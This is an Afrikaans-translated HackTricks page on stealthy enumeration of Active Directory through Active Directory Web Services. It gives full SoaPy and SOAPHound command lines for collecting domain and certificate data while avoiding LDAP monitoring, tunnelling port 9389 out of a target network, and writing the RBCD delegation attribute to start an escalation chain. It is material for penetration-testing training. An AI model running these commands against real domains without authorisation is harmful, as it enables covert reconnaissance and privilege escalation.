# Active Directory Web Services (ADWS) Enumerasie & Stealth-versameling

{{#include ../../banners/hacktricks-training.md}}

## Wat is ADWS?

Active Directory Web Services (ADWS) is **standaard geaktiveer op elke Domain Controller sedert Windows Server 2008 R2** en luister op TCP **9389**. Ondanks die naam, **geen HTTP is betrokke nie**. In plaas daarvan stel die diens LDAP-styl data bloot deur ’n stapel eienaardige .NET-framingsprotokolle:

* MC-NBFX → MC-NBFSE → MS-NNS → MC-NMF

Omdat die verkeer ingekapsel is binne hierdie binêre SOAP-frames en oor ’n ongebruiklike poort reis, is **enumerasie deur ADWS baie minder waarskynlik om geïnspekteer, gefilter of geteken te word as klassieke LDAP/389 & 636 verkeer**. Vir operateurs beteken dit:

* Meer stilrecon — Blue teams konsentreer dikwels op LDAP-navrae.
* Vryheid om te versamel van **non-Windows hosts (Linux, macOS)** deur 9389/TCP deur ’n SOCKS-proxy te stuur.
* Dieselfde data wat jy via LDAP sou verkry (users, groups, ACLs, schema, ens.) en die vermoë om **writes** uit te voer (bv. `msDs-AllowedToActOnBehalfOfOtherIdentity` vir **RBCD**).

ADWS-interaksies word geïmplementeer oor WS-Enumeration: elke navraag begin met ’n `Enumerate` boodskap wat die LDAP-filter/attribuite definieer en ’n `EnumerationContext` GUID teruggee, gevolg deur een of meer `Pull` boodskappe wat tot by die bediener-gedefinieerde resultaatvenster stroom. Contexts verval na ~30 minute, so tooling moet óf resultate in bladsye laai óf filters split (prefix queries per CN) om te verhoed dat staat verlore gaan. Wanneer jy vir security descriptors vra, spesifiseer die `LDAP_SERVER_SD_FLAGS_OID` control om SACLs uit te sluit, anders laat ADWS eenvoudig die `nTSecurityDescriptor` attribuut uit sy SOAP-antwoord val.

> NOTE: ADWS word ook deur baie RSAT GUI/PowerShell-instrumente gebruik, so verkeer kan met legitim admin-aktiwiteit meng.

## SoaPy – Native Python Client

[SoaPy](https://github.com/logangoins/soapy) is ’n **volle herimplementering van die ADWS-protokolstapel in suiwer Python**. Dit bou die NBFX/NBFSE/NNS/NMF-frames byte-vir-byte, wat versameling van Unix-agtige stelsels toelaat sonder om die .NET-runtime te gebruik.

### Sleutelkenmerke

* Ondersteun **proxying through SOCKS** (nuttig vanaf C2 implants).
* Fynkorrelige soekfilters identies aan LDAP `-q '(objectClass=user)'`.
* Opsionele **write** operasies (`--set` / `--delete`).
* **BOFHound output mode** vir direkte invoer in BloodHound.
* `--parse` vlag om timestamps / `userAccountControl` leesbaarder te formateer wanneer menslike leesbaarheid benodig word.

### Teiken-gespesifiseerde versamelingsvlae & write-operasies

SoaPy word met gekuratoreerde skakelaars gelewer wat die mees algemene LDAP-hunting take oor ADWS replikateer: `--users`, `--computers`, `--groups`, `--spns`, `--asreproastable`, `--admins`, `--constrained`, `--unconstrained`, `--rbcds`, plus rou `--query` / `--filter` knoppies vir pasgemaakte pulls. Kombineer dit met write-primitives soos `--rbcd <source>` (stel `msDs-AllowedToActOnBehalfOfOtherIdentity`), `--spn <service/cn>` (SPN staging vir teiken-gesentreerde Kerberoasting) en `--asrep` (flip `DONT_REQ_PREAUTH` in `userAccountControl`).

Example teiken-SPN hunt wat slegs `samAccountName` en `servicePrincipalName` teruggee:
```bash
soapy corp.local/alice:'Winter2025!'@dc01.corp.local \
--spns -f samAccountName,servicePrincipalName --parse
```
Gebruik dieselfde host/credentials om bevindinge onmiddellik te weaponiseer: dump RBCD-capable objects met `--rbcds`, en pas dan `--rbcd 'WEBSRV01$' --account 'FILE01$'` toe om 'n Resource-Based Constrained Delegation-ketting op te stel (sien [Resource-Based Constrained Delegation](resource-based-constrained-delegation.md) vir die volledige misbruikpad).

### Installasie (operator host)
```bash
python3 -m pip install soapy-adws   # or git clone && pip install -r requirements.txt
```
## SOAPHound – High-Volume ADWS Collection (Windows)

[FalconForce SOAPHound](https://github.com/FalconForceTeam/SOAPHound) is 'n .NET-versamelaar wat alle LDAP-interaksies binne ADWS hou en BloodHound v4-geskikte JSON uitstuur. Dit bou 'n volledige kas van `objectSid`, `objectGUID`, `distinguishedName` en `objectClass` een keer (`--buildcache`), en hergebruik dit dan vir hoë-volume `--bhdump`, `--certdump` (ADCS), of `--dnsdump` (AD-integrated DNS) passes sodat net ~35 kritieke attributte ooit die DC verlaat. AutoSplit (`--autosplit --threshold <N>`) opsplits vrae outomaties per CN-prefix om onder die 30-minute EnumerationContext timeout in groot forests te bly.

Tipiese werkvloei op 'n domain-joined operator VM:
```powershell
# Build cache (JSON map of every object SID/GUID)
SOAPHound.exe --buildcache -c C:\temp\corp-cache.json

# BloodHound collection in autosplit mode, skipping LAPS noise
SOAPHound.exe -c C:\temp\corp-cache.json --bhdump \
--autosplit --threshold 1200 --nolaps \
-o C:\temp\BH-output

# ADCS & DNS enrichment for ESC chains
SOAPHound.exe -c C:\temp\corp-cache.json --certdump -o C:\temp\BH-output
SOAPHound.exe --dnsdump -o C:\temp\dns-snapshot
```
Geëxporteerde JSON-slotte regstreeks in SharpHound/BloodHound-workvloei—see [BloodHound methodology](bloodhound.md) for downstream graphing ideas. AutoSplit maak SOAPHound veerkragtig op multi-miljoen-objek-foreste terwyl dit die navraagtelling laer hou as ADExplorer-styl snapshots.

## Stealth AD-versamelingswerkvloei

Die volgende werkvloei wys hoe om **domain & ADCS objects** oor ADWS te enumereer, dit na BloodHound JSON om te skakel en te jaag op sertifikaatgebaseerde aanvalspaaie – alles vanaf Linux:

1. **Tunnel 9389/TCP** vanaf die teiken-netwerk na jou masjien (bv. via Chisel, Meterpreter, SSH dynamic port-forward, ens.). Voer uit `export HTTPS_PROXY=socks5://127.0.0.1:1080` of gebruik SoaPy’s `--proxyHost/--proxyPort`.

2. **Versamel die wortel-domeinobjek:**
```bash
soapy ludus.domain/jdoe:'P@ssw0rd'@10.2.10.10 \
-q '(objectClass=domain)' \
| tee data/domain.log
```
3. **Versamel ADCS-verwante objekte uit die Configuration NC:**
```bash
soapy ludus.domain/jdoe:'P@ssw0rd'@10.2.10.10 \
-dn 'CN=Configuration,DC=ludus,DC=domain' \
-q '(|(objectClass=pkiCertificateTemplate)(objectClass=CertificationAuthority) \\
(objectClass=pkiEnrollmentService)(objectClass=msPKI-Enterprise-Oid))' \
| tee data/adcs.log
```
4. **Omskep na BloodHound:**
```bash
bofhound -i data --zip   # produces BloodHound.zip
```
5. **Laai die ZIP op** in die BloodHound GUI en voer cypher queries soos `MATCH (u:User)-[:Can_Enroll*1..]->(c:CertTemplate) RETURN u,c` uit om sertifikaat-eskalasiepade (ESC1, ESC8, ens.) te openbaar.

### Skryf `msDs-AllowedToActOnBehalfOfOtherIdentity` (RBCD)
```bash
soapy ludus.domain/jdoe:'P@ssw0rd'@dc.ludus.domain \
--set 'CN=Victim,OU=Servers,DC=ludus,DC=domain' \
msDs-AllowedToActOnBehalfOfOtherIdentity 'B:32:01....'
```
Kombineer dit met `s4u2proxy`/`Rubeus /getticket` vir 'n volledige **Resource-Based Constrained Delegation**-ketting (sien [Resource-Based Constrained Delegation](resource-based-constrained-delegation.md)).

## Opsomming van Gereedskap

| Doel | Gereedskap | Aantekeninge |
|---------|------|-------|
| ADWS enumeration | [SoaPy](https://github.com/logangoins/soapy) | Python, SOCKS, lees/skryf |
| High-volume ADWS dump | [SOAPHound](https://github.com/FalconForceTeam/SOAPHound) | .NET, cache-first, BH/ADCS/DNS modes |
| BloodHound ingest | [BOFHound](https://github.com/bohops/BOFHound) | Converts SoaPy/ldapsearch logs |
| Cert compromise | [Certipy](https://github.com/ly4k/Certipy) | Kan via dieselfde SOCKS geproksieer word |

## Verwysings

* [SpecterOps – Make Sure to Use SOAP(y) – An Operators Guide to Stealthy AD Collection Using ADWS](https://specterops.io/blog/2025/07/25/make-sure-to-use-soapy-an-operators-guide-to-stealthy-ad-collection-using-adws/)
* [SoaPy GitHub](https://github.com/logangoins/soapy)
* [BOFHound GitHub](https://github.com/bohops/BOFHound)
* [Microsoft – MC-NBFX, MC-NBFSE, MS-NNS, MC-NMF specifications](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-nbfx/)
* [IBM X-Force Red – Stealthy Enumeration of Active Directory Environments Through ADWS](https://logan-goins.com/2025-02-21-stealthy-enum-adws/)
* [FalconForce – SOAPHound tool to collect Active Directory data via ADWS](https://falconforce.nl/soaphound-tool-to-collect-active-directory-data-via-adws/)

{{#include ../../banners/hacktricks-training.md}}
